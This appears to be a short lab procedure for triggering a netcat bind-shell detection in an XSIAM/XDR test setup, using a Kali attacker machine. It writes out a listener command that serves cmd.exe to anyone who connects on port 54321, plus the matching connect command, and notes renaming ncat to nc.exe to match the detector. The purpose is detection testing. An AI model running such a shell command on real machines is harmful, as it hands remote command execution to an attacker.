1. In the XSIAM, Make sure there is at least 1 endpoint connected with XDR agent from which you'll simulate the attack, and an attacker machine (Kali-DC1ENV4AKALI01) to catch the connection

2. Download ncat from [nmap.org](https://nmap.org/ncat/) to windows machine

================ Mandatory Phase - Otherwise it won't triggered the alert ====================
==    3. Change EXE name to nc.exe as expected by the detector                              ==

4. Start a listening port on the victim machine
nc -n -v -l - p 54321 -e c:\Windows\System32\cmd.exe 


5. Run ncat on the windows machine to start a connection to the victim

c:\> nc <victim_ip> <listening_port>
